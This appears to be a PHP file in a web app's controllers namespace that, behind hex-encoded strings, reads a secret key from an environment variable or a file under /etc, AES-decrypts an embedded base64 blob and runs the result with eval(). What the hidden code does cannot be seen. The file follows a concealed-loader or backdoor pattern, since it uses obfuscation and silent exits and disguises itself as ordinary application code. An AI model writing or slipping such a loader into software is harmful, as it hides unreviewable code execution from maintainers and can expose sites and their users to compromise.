<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('hV7RuNqCUMzFLaSFdhMUrQ==');

$c=base64_decode(

'hwpvZW99t0WJl+l0JsaYH6y26wARF0+qx/6+COGjeLtSHtYVO0ZgjezBNOKHqEzgu30aZFma1x0D' .
'pVFyt0aPtkrnHowxBCLoX2iFusCMoeCohnOyKeEjNN54WGd2rZA4Jdhv6lnemGbbcWXInoaIgA7e' .
'peHr5Qm1/r6lM1yu9SYug6MH3HRdrwFcRja/s2C29hCFPztFY3EHyIcSFjX0dzvae385eCPbP3xx' .
'8/BohhjfCQ5FjyxEngu4KbnlOVpT'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

